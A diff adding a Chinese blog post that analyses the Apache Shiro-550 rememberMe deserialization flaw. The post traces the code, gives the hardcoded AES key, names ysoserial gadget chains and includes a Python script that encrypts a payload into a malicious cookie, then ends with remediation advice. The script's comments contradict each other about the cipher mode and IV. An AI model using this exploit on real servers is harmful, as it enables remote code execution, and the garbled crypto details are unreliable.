@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hai0unu11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x01 环境搭建 jdk8u65 Tomcat8 shiro 1.2.4  漏洞影响版本：Shiro &lt;&#x3D; 1.2.4 shiro550 的根本原因：固定 key 加密 项目地址： 1https:&#x2F;&#x2F;github.com&#x2F;phith0n&#x2F;JavaThings&#x2F;tree&#x2F;master&#x2F;shirodemo    0x02 漏洞分析漏洞原理用户在登录时勾选了“Remember Me”选">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro550漏洞分析">
+<meta property="og:url" content="https://hai0unu11.github.io/2026/08/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hai0uBlog">
+<meta property="og:description" content="0x01 环境搭建 jdk8u65 Tomcat8 shiro 1.2.4  漏洞影响版本：Shiro &lt;&#x3D; 1.2.4 shiro550 的根本原因：固定 key 加密 项目地址： 1https:&#x2F;&#x2F;github.com&#x2F;phith0n&#x2F;JavaThings&#x2F;tree&#x2F;master&#x2F;shirodemo    0x02 漏洞分析漏洞原理用户在登录时勾选了“Remember Me”选">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812153937508.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812154710474.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812154815253.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812161016206.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812161129617.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812161440231.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812161630618.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812163232741.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812161745899.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812161838030.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812162044218.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812164339701.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812164555562.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812164819095.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812164738342.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812172856920.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812173039343.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260812173702793.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260813170728158.png">
+<meta property="og:image" content="https://hai0unu11.github.io/images/image-20260813170747979.png">
+<meta property="article:published_time" content="2026-08-13T09:06:21.000Z">
+<meta property="article:modified_time" content="2026-08-13T09:29:48.873Z">
+<meta property="article:author" content="Hai0u">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hai0unu11.github.io/images/image-20260812153937508.png">
+
+
+<link rel="canonical" href="https://hai0unu11.github.io/2026/08/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hai0unu11.github.io/2026/08/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"2026/08/13/Shiro550漏洞分析/","title":"Shiro550漏洞分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Shiro550漏洞分析 | Hai0uBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hai0uBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">好好学习，天天向上！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">0x01 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">解密过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="nav-number">2.2.2.</span> <span class="nav-text">加密过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Shiro-550-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x03 Shiro-550 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.</span> <span class="nav-text">0x04 漏洞修复</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Hai0u</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hai0unu11.github.io/2026/08/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Hai0u">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hai0uBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Shiro550漏洞分析 | Hai0uBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shiro550漏洞分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-13 17:06:21 / 修改时间：17:29:48" itemprop="dateCreated datePublished" datetime="2026-08-13T17:06:21+08:00">2026-08-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/code-audit/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><ul>
+<li>jdk8u65</li>
+<li><a target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi">Tomcat8</a></li>
+<li>shiro 1.2.4</li>
+</ul>
+<p>漏洞影响版本：Shiro &lt;&#x3D; 1.2.4</p>
+<p>shiro550 的根本原因：固定 key 加密</p>
+<p>项目地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/phith0n/JavaThings/tree/master/shirodemo</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>用户在登录时勾选了“Remember Me”选项，服务端会生成一个经过 AES 加密（密钥硬编码或可预测）并序列化的 <code>rememberMe</code> Cookie，登录成功后，响应包的 <code>Set-Cookie</code> 头中会出现 <code>rememberMe=deleteMe</code>（用于清除无效 cookie）以及真正的 <code>rememberMe=&lt;base64加密数据&gt;</code>。此后客户端每次请求都会携带该 Cookie，Shiro 默认使用固定密钥（如 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）对序列化对象进行加密。攻击者可以构造恶意反序列化 payload（例如 CommonsCollections 链），用相同密钥加密后作为 <code>rememberMe</code> Cookie 发送。服务端解密并反序列化该 Cookie 时，触发任意命令执行，进而获取服务器权限（getshell）。</p>
+<p><img src="/images/image-20260812153937508.png" alt="image-20260812153937508"></p>
+<p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h4><p>入口：CookieRememberMeManager.getRememberedSerializedIdentity()</p>
+<p>判断是否为 HTTP 请求，获取 <code>rememberMe</code> Cookie 值</p>
+<p><img src="/images/image-20260812154710474.png" alt="image-20260812154710474">谁调用了 getRememberedSerializedIdentity() 这个方法。找到这里，主要</p>
+<p>取出 bytes 数组，调用 convertBytesToPrincipals(bytes)</p>
+<p><img src="/images/image-20260812154815253.png" alt="image-20260812154815253"></p>
+<p><img src="/images/image-20260812161016206.png" alt="image-20260812161016206"></p>
+<p>跟进convertBytesToPrincipals() 方法，将之前的 bytes 数组转换成了认证信息，在 convertBytesToPrincipals() 这个方法当中，很明确地做了两件事，一件是 decrypt 的解密，另一件是 deserialize 的反序列化。</p>
+<p><img src="/images/image-20260812161129617.png" alt="image-20260812161129617"></p>
+<p>到解密过程之 decrypt() 方法</p>
+<p><img src="/images/image-20260812161440231.png" alt="image-20260812161440231"></p>
+<p>点进 getDecryptionCipherKey() ，</p>
+<p><img src="/images/image-20260812161630618.png" alt="image-20260812161630618"></p>
+<p>在点进去decryptionCipherKey参数，发现了setDecryptionCipherKey方法</p>
+<p><img src="/images/image-20260812163232741.png" alt="image-20260812163232741"></p>
+<p>找谁调用了setDecryptionCipherKey()，最终追溯到 DEFAULT_CIPHER_KEY_BYTES（固定常量）</p>
+<p><img src="/images/image-20260812161745899.png" alt="image-20260812161745899"></p>
+<p><img src="/images/image-20260812161838030.png" alt="image-20260812161838030"></p>
+<p><img src="/images/image-20260812162044218.png" alt="image-20260812162044218"></p>
+<p>然后回到convertBytesToPrincipals()方法，跟进deserialize()方法，调用 readObject()，是典型的反序列化入口</p>
+<p><img src="/images/image-20260812164339701.png" alt="image-20260812164339701"></p>
+<h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p>直接断点到这里</p>
+<p><img src="/images/image-20260812164555562.png" alt="image-20260812164555562"></p>
+<p>跟进 <code>rememberIdentity()</code> 方法，这里一串调用，保存用户名。</p>
+<p><img src="/images/image-20260812164819095.png" alt="image-20260812164819095"></p>
+<p>跟进<code>this.rememberIdentity(subject, principals)</code>：</p>
+<p><img src="/images/image-20260812164738342.png" alt="image-20260812164738342"></p>
+<p>进入 <code>convertPrincipalsToBytes()</code> 方法，里面和我们之前看的解密里面的 <code>convertBytesToPrincipals()</code> 非常相似，不过将解密变成了加密，将反序列化改成了序列化。</p>
+<p><img src="/images/image-20260812172856920.png" alt="image-20260812172856920"></p>
+<p>后续差多，通过 AES 加密之后的 Cookie，拿去 Base64 编码。</p>
+<p><img src="/images/image-20260812173039343.png" alt="image-20260812173039343"></p>
+<p>所以可构造恶意序列化 payload → 用公开密钥 AES 加密 → Base64 编码 → 放入 rememberMe Cookie 发送 → 服务端解密并反序列化 → 触发 RCE</p>
+<h2 id="0x03-Shiro-550-漏洞利用"><a href="#0x03-Shiro-550-漏洞利用" class="headerlink" title="0x03 Shiro-550 漏洞利用"></a>0x03 Shiro-550 漏洞利用</h2><p><strong>简单点就直接使用ysoserial生成Payload</strong></p>
+<p><strong>常见适用于 Shiro 的链：<code>CommonsBeanutils1</code>、<code>CommonsCollections2</code>、<code>CommonsCollections4</code>、<code>JRMPClient</code> 等</strong></p>
+<p>Shiro 框架的 shiro-core 模块强依赖 commons-beanutils。 即使目标应用没有显式引入该库，只要使用了 Shiro 的权限注解（如 @RequiresRoles）、JSP 标签库或某些配置解析功能，Beanutils 就会被自动带入。</p>
+<p>但是许多 Shiro 应用可能只引入了 shiro-core，没有附带 commons-collections，但一定有 commons-beanutils。该链将无法直接使用。</p>
+<p><strong>无依赖变种（Shiro环境常用）</strong>：通过使用JDK自带的 <code>String.CASE_INSENSITIVE_ORDER</code>（其内部类 <code>CaseInsensitiveComparator</code>实现了 <code>Comparator</code>且可序列化）作为替代比较器，可以构造<strong>不依赖 <code>commons-collections</code>的CB链</strong>。这也是Shiro-550漏洞利用中常见的“无依赖”CB链（即<code>CommonsBeanutils1Shiro</code>）的核心思路。</p>
+<p>然后py用 Shiro 默认密钥加密并 Base64 编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 ysoserial 生成的二进制 payload</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shiro 默认 AES 密钥（Base64 解码后为 16 字节）</span></span><br><span class="line">key = base64.b64decode(<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES/CBC/PKCS5Padding 加密（IV 为 16 字节随机数，但 Shiro 实际使用 ECB 模式？）</span></span><br><span class="line"><span class="comment"># 注意：Shiro 的 RememberMe 使用的是 AES-128/CBC/PKCS5Padding，IV 固定为 16 个零字节。</span></span><br><span class="line">iv = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">encrypted = cipher.encrypt(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 编码</span></span><br><span class="line">encoded = base64.b64encode(encrypted).decode()</span><br><span class="line"><span class="built_in">print</span>(encoded)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20260812173702793.png" alt="image-20260812173702793"></p>
+<p>随着JDK版本升级（特别是引入JEP 290序列化过滤器等安全机制），CB链的利用可能会受到进一步限制，需要配合其他绕过技术。但这更多是JDK版本而非CB库版本的限制。</p>
+<h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><p>升级至≥1.2.6版本，官方移除了默认密钥强制要求。在shiro.ini或配置类中设置随机生成的密钥</p>
+<p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。</p>
+<p><img src="/images/image-20260813170728158.png" alt="image-20260813170728158"></p>
+<p><img src="/images/image-20260813170747979.png" alt="image-20260813170747979"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/08/13/fastjson-1-2-68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="fastjson &lt;&#x3D; 1.2.68漏洞分析">
+                  <i class="fa fa-angle-left"></i> fastjson <= 1.2.68漏洞分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/08/13/build/" rel="next" title="build">
+                  build <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Hai0u</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
